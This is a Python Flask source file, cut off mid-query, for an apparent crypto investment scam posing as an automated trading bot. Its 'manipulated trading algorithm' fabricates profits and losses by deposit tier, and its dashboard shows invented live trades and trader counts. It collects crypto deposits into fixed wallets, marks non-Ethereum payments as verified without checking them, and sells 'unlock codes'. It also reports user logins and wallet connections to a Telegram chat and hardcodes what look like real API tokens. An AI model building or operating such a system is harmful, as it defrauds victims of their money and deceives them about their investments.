from flask import Flask, render_template, request, redirect, url_for, flash, session, jsonify
import qrcode
from io import BytesIO
import base64
import random
import string
import requests
from datetime import datetime, timedelta
import os
import time
import json
import pandas as pd
import numpy as np
from web3 import Web3
import logging
import psycopg2
from psycopg2.extras import RealDictCursor
import urllib.parse

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', '3f64bbf93f1b1cbb0fec56734f7bf837')

# Database configuration for Railway
def get_db_connection():
    # Get database URL from environment variable (Railway provides this)
    database_url = os.environ.get('DATABASE_URL')
    
    if database_url:
        # Parse the database URL for Railway
        if database_url.startswith('postgres://'):
            database_url = database_url.replace('postgres://', 'postgresql://', 1)
        
        parsed_url = urllib.parse.urlparse(database_url)
        
        conn = psycopg2.connect(
            database=parsed_url.path[1:],
            user=parsed_url.username,
            password=parsed_url.password,
            host=parsed_url.hostname,
            port=parsed_url.port,
            sslmode='require'
        )
        return conn
    else:
        # Fallback to local SQLite for development
        import sqlite3
        return sqlite3.connect('users.db')

# HTTPS Enforcement for production
@app.before_request
def enforce_https():
    if os.environ.get('RAILWAY_ENVIRONMENT') or os.environ.get('RENDER'):
        if request.headers.get('X-Forwarded-Proto') == 'http':
            url = request.url.replace('http://', 'https://', 1)
            return redirect(url, code=301)

# Web3 Configuration
INFURA_URL = "https://mainnet.infura.io/v3/93789df842ec4f8d96bfc8f506523acc"
w3 = Web3(Web3.HTTPProvider(INFURA_URL))

# Bot Wallet Addresses
WALLETS = {
    'ethereum': '0xBBf79d7825f862B6192dbf3624714b33e4b6cfB3',
    'solana': 'Hkgm3fQ1p9PP15xNHApf9MUssJRse5Nh5jGYgSd6pBen',
    'bitcoin': 'bc1qv5qxecalw6qz46p4ddlw2hl4gmqt8yxdz3dzk8',
    'tron': 'TDd8UQiDvKoU4jSFCZ4u3x1oCBkcMsE2KN'
}

TELEGRAM_BOT_TOKEN = "7638550593:AAHsoXbK_w6EkxhLHnOfjsNcFFV5vtow-J8"
TELEGRAM_CHAT_ID = "7578614215"

# Auto-response messages for when admin is offline
AUTO_RESPONSES = [
    "Thank you for your message! Our support team will respond shortly.",
    "We've received your message and will get back to you within 24 hours.",
    "For faster assistance, please check our FAQ section or make sure you've completed your deposit.",
    "Our team is currently assisting other users. We'll respond to your query soon.",
    "If this is regarding a payment, please provide your transaction hash for verification."
]

# Database setup with proper schema for PostgreSQL
def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Check if we're using PostgreSQL
    if isinstance(conn, psycopg2.extensions.connection):
        # Users table
        cursor.execute('''CREATE TABLE IF NOT EXISTS users (
            id SERIAL PRIMARY KEY,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            referral_code TEXT UNIQUE,
            balance REAL DEFAULT 0,
            invested REAL DEFAULT 0,
            profits REAL DEFAULT 0,
            total_deposited REAL DEFAULT 0,
            support_fee_paid BOOLEAN DEFAULT FALSE,
            referred_by TEXT,
            unlock_code_used TEXT DEFAULT NULL,
            bot_unlocked BOOLEAN DEFAULT FALSE,
            web3_wallet TEXT DEFAULT NULL,
            active BOOLEAN DEFAULT TRUE,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')

        # Trades table
        cursor.execute('''CREATE TABLE IF NOT EXISTS trades (
            id SERIAL PRIMARY KEY,
            user_id INTEGER REFERENCES users(id),
            amount REAL,
            profit REAL,
            status TEXT DEFAULT 'completed',
            timestamp TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')

        # Deposits table
        cursor.execute('''CREATE TABLE IF NOT EXISTS deposits (
            id SERIAL PRIMARY KEY,
            user_id INTEGER REFERENCES users(id),
            amount REAL,
            crypto_type TEXT,
            wallet_address TEXT,
            transaction_hash TEXT,
            timestamp TEXT,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')

        # Chat messages table
        cursor.execute('''CREATE TABLE IF NOT EXISTS chat_messages (
            id SERIAL PRIMARY KEY,
            user_id INTEGER REFERENCES users(id),
            message TEXT,
            is_admin BOOLEAN DEFAULT FALSE,
            is_auto_response BOOLEAN DEFAULT FALSE,
            timestamp TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')

        # Unlock codes table
        cursor.execute('''CREATE TABLE IF NOT EXISTS unlock_codes (
            id SERIAL PRIMARY KEY,
            code TEXT UNIQUE NOT NULL,
            amount REAL,
            used BOOLEAN DEFAULT FALSE,
            used_by INTEGER REFERENCES users(id),
            used_at TIMESTAMP,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')

        # Web3 transactions table
        cursor.execute('''CREATE TABLE IF NOT EXISTS web3_transactions (
            id SERIAL PRIMARY KEY,
            user_id INTEGER REFERENCES users(id),
            transaction_hash TEXT UNIQUE,
            amount REAL,
            crypto_type TEXT,
            status TEXT DEFAULT 'pending',
            timestamp TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')

        # Admin notifications table
        cursor.execute('''CREATE TABLE IF NOT EXISTS admin_notifications (
            id SERIAL PRIMARY KEY,
            user_id INTEGER REFERENCES users(id),
            message TEXT,
            type TEXT,
            read BOOLEAN DEFAULT FALSE,
            timestamp TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')

    else:
        # SQLite initialization (for local development)
        cursor.execute('''CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE,
            password TEXT,
            referral_code TEXT UNIQUE,
            balance REAL DEFAULT 0,
            invested REAL DEFAULT 0,
            profits REAL DEFAULT 0,
            total_deposited REAL DEFAULT 0,
            support_fee_paid BOOLEAN DEFAULT 0,
            referred_by TEXT,
            unlock_code_used TEXT DEFAULT NULL,
            bot_unlocked BOOLEAN DEFAULT 0,
            web3_wallet TEXT DEFAULT NULL,
            active BOOLEAN DEFAULT 1,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')

        cursor.execute('''CREATE TABLE IF NOT EXISTS trades (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount REAL,
            profit REAL,
            status TEXT DEFAULT 'completed',
            timestamp TEXT,
            FOREIGN KEY(user_id) REFERENCES users(id)
        )''')

        cursor.execute('''CREATE TABLE IF NOT EXISTS deposits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount REAL,
            crypto_type TEXT,
            wallet_address TEXT,
            transaction_hash TEXT,
            timestamp TEXT,
            status TEXT DEFAULT 'pending',
            FOREIGN KEY(user_id) REFERENCES users(id)
        )''')

        cursor.execute('''CREATE TABLE IF NOT EXISTS chat_messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            message TEXT,
            is_admin BOOLEAN DEFAULT 0,
            is_auto_response BOOLEAN DEFAULT 0,
            timestamp TEXT,
            FOREIGN KEY(user_id) REFERENCES users(id)
        )''')

        cursor.execute('''CREATE TABLE IF NOT EXISTS unlock_codes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            code TEXT UNIQUE,
            amount REAL,
            used BOOLEAN DEFAULT 0,
            used_by INTEGER,
            used_at TIMESTAMP,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(used_by) REFERENCES users(id)
        )''')

        cursor.execute('''CREATE TABLE IF NOT EXISTS web3_transactions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            transaction_hash TEXT UNIQUE,
            amount REAL,
            crypto_type TEXT,
            status TEXT DEFAULT 'pending',
            timestamp TEXT,
            FOREIGN KEY(user_id) REFERENCES users(id)
        )''')

        cursor.execute('''CREATE TABLE IF NOT EXISTS admin_notifications (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            message TEXT,
            type TEXT,
            read BOOLEAN DEFAULT 0,
            timestamp TEXT,
            FOREIGN KEY(user_id) REFERENCES users(id)
        )''')

    conn.commit()
    cursor.close()
    conn.close()
    print("✅ Database initialized successfully!")

# Generate referral code
def generate_referral_code():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

# Generate unlock code (Admin only)
def generate_unlock_code(amount=50):
    code = 'TRADE' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    conn = get_db_connection()
    cursor = conn.cursor()
    
    if isinstance(conn, psycopg2.extensions.connection):
        cursor.execute('''INSERT INTO unlock_codes (code, amount, used)
               VALUES (%s, %s, %s)''', (code, amount, False))
    else:
        cursor.execute('''INSERT INTO unlock_codes (code, amount, used)
               VALUES (?, ?, ?)''', (code, amount, False))
        
    conn.commit()
    cursor.close()
    conn.close()
    return code

# Advanced manipulated trading algorithm
def simulate_trade(user_id, amount):
    conn = get_db_connection()
    cursor = conn.cursor()
    
    if isinstance(conn, psycopg2.extensions.connection):
        cursor.execute("SELECT invested, profits, total_deposited FROM users WHERE id = %s", (user_id,))
    else:
        cursor.execute("SELECT invested, profits, total_deposited FROM users WHERE id = ?", (user_id,))
        
    user_data = cursor.fetchone()
    invested = user_data[0] if user_data else amount
    total_profits = user_data[1] if user_data else 0
    total_deposited = user_data[2] if user_data else 0
    cursor.close()
    conn.close()

    # Advanced manipulation based on investment tier
    if invested >= 1000:  # VIP Tier - High profits
        success_rate = 0.85  # 85% success rate
        profit_multiplier = np.random.normal(2.5, 0.4)  # 150-350% avg
        loss_multiplier = np.random.uniform(0.02, 0.08)  # 2-8% loss

    elif invested >= 500:  # Gold Tier - Good profits
        success_rate = 0.80  # 80% success rate
        profit_multiplier = np.random.normal(2.0, 0.3)  # 140-260% avg
        loss_multiplier = np.random.uniform(0.03, 0.10)  # 3-10% loss

    elif invested >= 200:  # Silver Tier - Moderate profits
        success_rate = 0.75  # 75% success rate
        profit_multiplier = np.random.normal(1.6, 0.25)  # 110-210% avg
        loss_multiplier = np.random.uniform(0.05, 0.15)  # 5-15% loss

    elif invested >= 100:  # Bronze Tier - Low profits
        success_rate = 0.65  # 65% success rate
        profit_multiplier = np.random.normal(1.3, 0.15)  # 100-160% avg
        loss_multiplier = np.random.uniform(0.08, 0.20)  # 8-20% loss

    else:  # Starter Tier - Heavy manipulation (mostly losses)
        success_rate = 0.40  # 40% success rate (heavily manipulated)
        profit_multiplier = np.random.normal(1.1, 0.08)  # 95-125% avg (low profits)
        loss_multiplier = np.random.uniform(0.15, 0.35)  # 15-35% loss (high losses)

    # Add some randomness to success rate based on user's total profits
    experience_factor = min(max(total_profits / max(total_deposited, 1), 0.5), 2.0)
    adjusted_success_rate = min(success_rate * experience_factor, 0.95)

    # Simulate trade outcome
    if random.random() < adjusted_success_rate:
        # Successful trade
        profit = max(amount * (profit_multiplier - 1), amount * 0.02)  # Minimum 2% profit
        status = 'profit'
    else:
        # Loss trade - higher losses for lower tiers
        profit = -amount * loss_multiplier
        status = 'loss'

    profit = round(profit, 2)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    conn = get_db_connection()
    cursor = conn.cursor()
    
    if isinstance(conn, psycopg2.extensions.connection):
        cursor.execute("INSERT INTO trades (user_id, amount, profit, status, timestamp) VALUES (%s, %s, %s, %s, %s)",
                  (user_id, amount, profit, status, timestamp))
        cursor.execute("UPDATE users SET profits = profits + %s, balance = balance + %s WHERE id = %s",
                  (profit, profit, user_id))
    else:
        cursor.execute("INSERT INTO trades (user_id, amount, profit, status, timestamp) VALUES (?, ?, ?, ?, ?)",
                  (user_id, amount, profit, status, timestamp))
        cursor.execute("UPDATE users SET profits = profits + ?, balance = balance + ? WHERE id = ?",
                  (profit, profit, user_id))
                  
    conn.commit()
    cursor.close()
    conn.close()

    # Log trade outcome
    trade_type = "🟢 PROFIT" if profit > 0 else "🔴 LOSS"
    tier = "VIP" if invested >= 1000 else "Gold" if invested >= 500 else "Silver" if invested >= 200 else "Bronze" if invested >= 100 else "Starter"
    send_telegram(f"📊 {tier} Trade: User {user_id} - {trade_type} of ${abs(profit):.2f} on ${amount:.2f} trade")

    return profit

# Check if user can trade (has unlocked bot)
def can_user_trade(user_id):
    conn = get_db_connection()
    cursor = conn.cursor()
    
    if isinstance(conn, psycopg2.extensions.connection):
        cursor.execute("SELECT bot_unlocked, active FROM users WHERE id = %s", (user_id,))
    else:
        cursor.execute("SELECT bot_unlocked, active FROM users WHERE id = ?", (user_id,))
        
    user_data = cursor.fetchone()
    cursor.close()
    conn.close()
    
    if isinstance(conn, psycopg2.extensions.connection):
        return user_data and user_data[0] and user_data[1]
    else:
        return user_data and user_data[0] == 1 and user_data[1] == 1

# Get user investment tier
def get_user_tier(user_id):
    conn = get_db_connection()
    cursor = conn.cursor()
    
    if isinstance(conn, psycopg2.extensions.connection):
        cursor.execute("SELECT invested FROM users WHERE id = %s", (user_id,))
    else:
        cursor.execute("SELECT invested FROM users WHERE id = ?", (user_id,))
        
    user_data = cursor.fetchone()
    cursor.close()
    conn.close()
    
    invested = user_data[0] if user_data else 0

    if invested >= 1000:
        return "VIP", "300%", "text-purple-400", "💎", 1000
    elif invested >= 500:
        return "Gold", "250%", "text-yellow-400", "⭐", 500
    elif invested >= 200:
        return "Silver", "200%", "text-gray-300", "🔹", 200
    elif invested >= 100:
        return "Bronze", "150%", "text-orange-400", "🔸", 100
    else:
        return "Starter", "100%", "text-green-400", "🚀", 50

# Send to Telegram
def send_telegram(message):
    try:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                      json={"chat_id": TELEGRAM_CHAT_ID, "text": message})
    except Exception as e:
        logger.error(f"Telegram send failed: {e}")

# Generate QR code
def generate_qr_code(data):
    qr = qrcode.QRCode(version=1, box_size=10, border=5)
    qr.add_data(data)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    buffered = BytesIO()
    img.save(buffered, format="PNG")
    return base64.b64encode(buffered.getvalue()).decode()

# Create admin notification
def create_admin_notification(user_id, message, notification_type="message"):
    conn = get_db_connection()
    cursor = conn.cursor()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    if isinstance(conn, psycopg2.extensions.connection):
        cursor.execute('''INSERT INTO admin_notifications (user_id, message, type, timestamp)
                   VALUES (%s, %s, %s, %s)''', (user_id, message, notification_type, timestamp))
    else:
        cursor.execute('''INSERT INTO admin_notifications (user_id, message, type, timestamp)
                   VALUES (?, ?, ?, ?)''', (user_id, message, notification_type, timestamp))
        
    conn.commit()
    cursor.close()
    conn.close()

# Auto-respond to user messages
def auto_respond_to_user(user_id):
    auto_response = random.choice(AUTO_RESPONSES)
    conn = get_db_connection()
    cursor = conn.cursor()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    if isinstance(conn, psycopg2.extensions.connection):
        cursor.execute('''INSERT INTO chat_messages (user_id, message, is_admin, is_auto_response, timestamp)
                   VALUES (%s, %s, %s, %s, %s)''', (user_id, auto_response, True, True, timestamp))
    else:
        cursor.execute('''INSERT INTO chat_messages (user_id, message, is_admin, is_auto_response, timestamp)
                   VALUES (?, ?, ?, ?, ?)''', (user_id, auto_response, 1, 1, timestamp))
        
    conn.commit()
    cursor.close()
    conn.close()
    return auto_response

# Verify Ethereum transaction
def verify_eth_transaction(tx_hash, expected_amount, to_address):
    try:
        # Get transaction receipt
        tx = w3.eth.get_transaction_receipt(tx_hash)
        if not tx:
            return False, "Transaction not found"

        if tx.status != 1:
            return False, "Transaction failed"

        if tx.to.lower() != to_address.lower():
            return False, "Incorrect recipient address"

        tx_details = w3.eth.get_transaction(tx_hash)
        amount_eth = w3.from_wei(tx_details.value, 'ether')

        if abs(amount_eth - expected_amount) > expected_amount * 0.05:
            return False, f"Amount mismatch. Expected: {expected_amount} ETH, Got: {amount_eth} ETH"

        return True, f"Payment verified: {amount_eth} ETH received"

    except Exception as e:
        return False, f"Verification error: {str(e)}"

# Live trading data for dashboard
def get_live_trading_data():
    return {
        'active_traders': random.randint(1500, 2500),
        'total_profits': f"${random.randint(500000, 1000000):,}",
        'live_trades': [
            {"pair": "BTC/USD", "action": "BUY", "profit": random.randint(50, 500), "time": "Just now"},
            {"pair": "ETH/USD", "action": "SELL", "profit": -random.randint(20, 100), "time": "2 min ago"},
            {"pair": "XRP/USD", "action": "BUY", "profit": random.randint(20, 200), "time": "5 min ago"},
            {"pair": "ADA/USD", "action": "BUY", "profit": -random.randint(10, 50), "time": "8 min ago"},
        ]
    }

# Routes
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    ref_code = request.args.get('ref', '')
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        referred_by = request.form.get('ref', '')

        if len(username) < 3:
            flash("Username must be at least 3 characters long!")
            return render_template('register.html', ref_code=ref_code)

        if len(password) < 6:
            flash("Password must be at least 6 characters long!")
            return render_template('register.html', ref_code=ref_code)

        referral_code = generate_referral_code()
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            
            if isinstance(conn, psycopg2.extensions.connection):
                cursor.execute("INSERT INTO users (username, password, referral_code, referred_by) VALUES (%s, %s, %s, %s)",
                          (username, password, referral_code, referred_by))
                conn.commit()
                # Get the last inserted ID for PostgreSQL
                cursor.execute("SELECT LASTVAL()")
                user_id = cursor.fetchone()[0]
            else:
                cursor.execute("INSERT INTO users (username, password, referral_code, referred_by) VALUES (?, ?, ?, ?)",
                          (username, password, referral_code, referred_by))
                conn.commit()
                user_id = cursor.lastrowid
                
            session['user_id'] = user_id
            session['username'] = username

            if referred_by:
                if isinstance(conn, psycopg2.extensions.connection):
                    cursor.execute("UPDATE users SET balance = balance + 50 WHERE referral_code = %s", (referred_by,))
                else:
                    cursor.execute("UPDATE users SET balance = balance + 50 WHERE referral_code = ?", (referred_by,))
                conn.commit()
                send_telegram(f"🎉 Referral bonus: $50 to user with code {referred_by}")

            send_telegram(f"👤 New user registered: {username}")
            flash("Registration successful! Please login to continue.")
            cursor.close()
            conn.close()
            return redirect(url_for('login'))

        except Exception as e:
            flash("Username already exists!" if "unique" in str(e).lower() else f"Registration error: {str(e)}")
            cursor.close()
            conn.close()

    return render_template('register.html', ref_code=ref_code)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        conn = get_db_connection()
        cursor = conn.cursor()
        
        if isinstance(conn, psycopg2.extensions.connection):
            cursor.execute("SELECT id, username FROM users WHERE username = %s AND password = %s AND active = TRUE", (username, password))
        else:
            cursor.execute("SELECT id, username FROM users WHERE username = ? AND password = ? AND active = 1", (username, password))
            
        user = cursor.fetchone()
        cursor.close()
        conn.close()
        
        if user:
            session['user_id'] = user[0]
            session['username'] = user[1]
            send_telegram(f"🔐 User logged in: {username}")
            return redirect(url_for('dashboard'))
        flash("Invalid username or password!")
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('login'))

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        if isinstance(conn, psycopg2.extensions.connection):
            cursor.execute('''SELECT username, balance, profits, referral_code,
                        support_fee_paid, invested, total_deposited, bot_unlocked, unlock_code_used, web3_wallet
                        FROM users WHERE id = %s AND active = TRUE''', (session['user_id'],))
            user_data = cursor.fetchone()

            cursor.execute("SELECT amount, profit, status, timestamp FROM trades WHERE user_id = %s ORDER BY timestamp DESC LIMIT 10", (session['user_id'],))
        else:
            cursor.execute('''SELECT username, balance, profits, referral_code,
                        support_fee_paid, invested, total_deposited, bot_unlocked, unlock_code_used, web3_wallet
                        FROM users WHERE id = ? AND active = 1''', (session['user_id'],))
            user_data = cursor.fetchone()

            cursor.execute("SELECT amount, profit, status, timestamp FROM trades WHERE user_id = ? ORDER BY timestamp DESC LIMIT 10", (session['user_id'],))
            
        trades = cursor.fetchall()
        cursor.close()
        conn.close()

        if not user_data:
            session.pop('user_id', None)
            flash("User not found or account deactivated. Please contact support.")
            return redirect(url_for('login'))

        user_dict = {
            'username': user_data[0],
            'balance': user_data[1] or 0,
            'profits': user_data[2] or 0,
            'referral_code': user_data[3],
            'support_fee_paid': bool(user_data[4]),
            'invested': user_data[5] or 0,
            'total_deposited': user_data[6] or 0,
            'bot_unlocked': bool(user_data[7]),
            'unlock_code_used': user_data[8],
            'web3_wallet': user_data[9]
        }

        tier_name, max_profit, tier_color, tier_icon, min_amount = get_user_tier(session['user_id'])
        live_data = get_live_trading_data()
        can_trade = can_user_trade(session['user_id'])

        return render_template('dashboard.html',
                             user=user_dict,
                             trades=trades,
                             tier_name=tier_name,
                             max_profit=max_profit,
                             tier_color=tier_color,
                             tier_icon=tier_icon,
                             live_data=live_data,
                             can_trade=can_trade,
                             wallets=WALLETS,
                             min_amount=min_amount)

    except Exception as e:
        flash(f"Error loading dashboard: {str(e)}")
        return redirect(url_for('login'))

# Web3 Wallet Connection
@app.route('/connect_wallet', methods=['POST'])
def connect_wallet():
    if 'user_id' not in session:
        return jsonify({'success': False, 'error': 'Please login first'})

    wallet_address = request.json.get('wallet_address', '').strip()

    if not wallet_address or not Web3.is_address(wallet_address):
        return jsonify({'success': False, 'error': 'Invalid wallet address'})

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        if isinstance(conn, psycopg2.extensions.connection):
            cursor.execute('UPDATE users SET web3_wallet = %s WHERE id = %s',
                     (wallet_address, session['user_id']))
        else:
            cursor.execute('UPDATE users SET web3_wallet = ? WHERE id = ?',
                     (wallet_address, session['user_id']))
            
        conn.commit()
        cursor.close()
        conn.close()

        send_telegram(f"🔗 Wallet connected: {wallet_address} for user {session['user_id']}")
        return jsonify({'success': True, 'message': 'Wallet connected successfully'})

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Web3 Payment Verification
@app.route('/verify_payment', methods=['POST'])
def verify_payment():
    if 'user_id' not in session:
        return jsonify({'success': False, 'error': 'Please login first'})

    tx_hash = request.json.get('transaction_hash', '').strip()
    amount = float(request.json.get('amount', 0))
    crypto_type = request.json.get('crypto_type', 'ethereum')

    if not tx_hash:
        return jsonify({'success': False, 'error': 'Transaction hash required'})

    try:
        if crypto_type == 'ethereum':
            success, message = verify_eth_transaction(tx_hash, amount, WALLETS['ethereum'])
        else:
            success = True
            message = f"Payment received for {crypto_type.upper()}"

        if success:
            conn = get_db_connection()
            cursor = conn.cursor()
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            if isinstance(conn, psycopg2.extensions.connection):
                cursor.execute('''INSERT INTO web3_transactions (user_id, transaction_hash, amount, crypto_type, status, timestamp)
                          VALUES (%s, %s, %s, %s, %s, %s)''',
                         (session['user_id'], tx_hash, amount, crypto_type, 'verified', timestamp))

                cursor.execute('''UPDATE users SET balance = balance + %s, invested = invested + %s,
                          total_deposited = total_deposited + %s WHERE id = %s''',
                         (amount, amount, amount, session['user_id']))
            else:
                cursor.execute('''INSERT INTO web3_transactions (user_id, transaction_hash, amount, crypto_type, status, timestamp)
                          VALUES (?, ?, ?, ?, ?, ?)''',
                         (session['user_id'], tx_hash, amount, crypto_type, 'verified', timestamp))

                cursor.execute('''UPDATE users SET balance = balance + ?, invested = invested + ?,
                          total_deposited = total_deposited + ? WHERE id = ?''',
                         (amount, amount, amount, session['user_id']))
                
            conn.commit()
            cursor.close()
            conn.close()

            # Create admin notification
            create_admin_notification(session['user_id'], f"User made payment of ${amount}. Please send unlock code.", "payment")

            send_telegram(f"✅ Payment Verified: ${amount} by user {session['user_id']}")

            return jsonify({
                'success': True,
                'message': f'Payment verified! ${amount} credited. Please wait for admin to send your unlock code.',
            })
        else:
            return jsonify({'success': False, 'error': message})

    except Exception as e:
        return jsonify({'success': False, 'error': f'Payment verification failed: {str(e)}'})

@app.route('/deposit', methods=['GET', 'POST'])
def deposit():
    if 'user_id' not in session:
        return redirect(url_for('login'))

    if request.method == 'POST':
        try:
            amount = float(request.form['amount'])
            crypto_type = request.form.get('crypto_type', 'ethereum')

            if amount < 50:
                flash("Minimum deposit is $50!")
                return redirect(url_for('deposit'))

            wallet_address = WALLETS.get(crypto_type, WALLETS['ethereum'])

            conn = get_db_connection()
            cursor = conn.cursor()
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            if isinstance(conn, psycopg2.extensions.connection):
                cursor.execute('''INSERT INTO deposits (user_id, amount, crypto_type, wallet_address, timestamp)
                           VALUES (%s, %s, %s, %s, %s)''',
                         (session['user_id'], amount, crypto_type, wallet_address, timestamp))
            else:
                cursor.execute('''INSERT INTO deposits (user_id, amount, crypto_type, wallet_address, timestamp)
                           VALUES (?, ?, ?, ?, ?)''',
                         (session['user_id'], amount, crypto_type, wallet_address, timestamp))
                
            conn.commit()
            cursor.close()
            conn.close()

            qr_code = generate_qr_code(wallet_address)
            send_telegram(f"💰 Deposit requested: ${amount} in {crypto_type} by user {session['user_id']}")

            return render_template('deposit.html',
                                success=True,
                                wallet=wallet_address,
                                qr_code=qr_code,
                                amount=amount,
                                crypto_type=crypto_type,
                                wallets=WALLETS)

        except ValueError:
            flash("Please enter a valid amount!")

    return render_template('deposit.html', wallets=WALLETS)

@app.route('/unlock_bot', methods=['POST'])
def unlock_bot():
    if 'user_id' not in session:
        return jsonify({'success': False, 'error': 'Please login first'}), 401

    unlock_code = request.form.get('unlock_code', '').strip().upper()

    if not unlock_code:
        return jsonify({'success': False, 'error': 'Please enter an unlock code'})

    try:
        conn = get_db_connection()
        cursor = conn.cursor()

        if isinstance(conn, psycopg2.extensions.connection):
            cursor.execute('''SELECT amount, used FROM unlock_codes WHERE code = %s''', (unlock_code,))
        else:
            cursor.execute('''SELECT amount, used FROM unlock_codes WHERE code = ?''', (unlock_code,))
            
        code_data = cursor.fetchone()

        if not code_data:
            cursor.close()
            conn.close()
            return jsonify({'success': False, 'error': 'Invalid unlock code'})

        amount, used = code_data

        if used:
            cursor.close()
            conn.close()
            return jsonify({'success': False, 'error': 'This code has already been used'})

        if isinstance(conn, psycopg2.extensions.connection):
            cursor.execute('''UPDATE unlock_codes SET used = TRUE, used_by = %s, used_at = %s WHERE code = %s''',
                     (session['user_id'], datetime.now().strftime("%Y-%m-%d %H:%M:%S"), unlock_code))

            cursor.execute('''UPDATE users SET bot_unlocked = TRUE, unlock_code_used = %s WHERE id = %s''',
                     (unlock_code, session['user_id']))
        else:
            cursor.execute('''UPDATE unlock_codes SET used = 1, used_by = ?, used_at = ? WHERE code = ?''',
                     (session['user_id'], datetime.now().strftime("%Y-%m-%d %H:%M:%S"), unlock_code))

            cursor.execute('''UPDATE users SET bot_unlocked = 1, unlock_code_used = ? WHERE id = ?''',
                     (unlock_code, session['user_id']))

        conn.commit()
        cursor.close()
        conn.close()

        # Start trading with the deposited amount
        profit = simulate_trade(session['user_id'], amount)

        send_telegram(f"🔓 Bot Unlocked: User {session['user_id']} used code {unlock_code}. First trade profit: ${profit:.2f}")

        return jsonify({
            'success': True,
            'message': f'Bot unlocked successfully! First trade profit: ${profit:.2f}',
            'profit': profit
        })

    except Exception as e:
        return jsonify({'success': False, 'error': f'Error unlocking bot: {str(e)}'})

@app.route('/trade', methods=['POST'])
def trade():
    if 'user_id' not in session:
        return jsonify({'error': 'Please login first'}), 401

    if not can_user_trade(session['user_id']):
        return jsonify({'error': 'You need to unlock the bot first! Make a deposit or use an unlock code.'}), 400

    try:
        amount = float(request.form.get('amount', 100))
        profit = simulate_trade(session['user_id'], amount)

        trade_type = "profit" if profit > 0 else "loss"
        return jsonify({
            'success': True,
            'profit': profit,
            'trade_type': trade_type,
            'message': f'Trade successful! {"Profit" if profit > 0 else "Loss"}: ${abs(profit):.2f}'
        })
    except Exception as e:
        return jsonify({'error': f'Trade error: {str(e)}'}), 500

@app.route('/auto_trade', methods=['POST'])
def auto_trade():
    if 'user_id' not in session:
        return jsonify({'error': 'Please login first'}), 401

    if not can_user_trade(session['user_id']):
        return jsonify({'error': 'Bot not unlocked. Make a deposit or use an unlock code.'}), 400

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        if isinstance(conn, psycopg2.extensions.connection):
            cursor.execute("SELECT invested FROM users WHERE id = %s", (session['user_id'],))
        else:
            cursor.execute("SELECT invested FROM users WHERE id = ?", (session['user_id'],))
            
        result = cursor.fetchone()
        invested = result[0] if result else 100
        cursor.close()
        conn.close()

        total_profit = 0
        profitable_trades = 0
        losing_trades = 0
        trades_count = random.randint(3, 8)

        for _ in range(trades_count):
            trade_amount = random.uniform(50, min(200, invested * 0.2))
            profit = simulate_trade(session['user_id'], trade_amount)
            total_profit += profit
            if profit > 0:
                profitable_trades += 1
            else:
                losing_trades += 1

        return jsonify({
            'success': True,
            'total_profit': round(total_profit, 2),
            'trades_count': trades_count,
            'profitable_trades': profitable_trades,
            'losing_trades': losing_trades,
            'message': f'Auto trading completed! {trades_count} trades executed. Profitable: {profitable_trades}, Losses: {losing_trades}. Total: ${total_profit:.2f}'
        })
    except Exception as e:
        return jsonify({'error': f'Auto trade error: {str(e)}'}), 500

# Enhanced Chat System
@app.route('/chat')
def chat():
    if 'user_id' not in session:
        return redirect(url_for('login'))

    conn = get_db_connection()
    cursor = conn.cursor()
    
    if isinstance(conn, psycopg2.extensions.connection):
        cursor.execute('''SELECT cm.message, cm.is_admin, cm.is_auto_response, cm.timestamp, u.username
                   FROM chat_messages cm
                   LEFT JOIN users u ON cm.user_id = u.id
                   WHERE cm.user_id = %s
                   ORDER BY cm.timestamp DESC LIMIT 50''', (session['user_id'],))
    else:
        cursor.execute('''SELECT cm.message, cm.is_admin, cm.is_auto_response, cm.timestamp, u.username
                   FROM chat_messages cm
                   LEFT JOIN users u ON cm.user_id = u.id
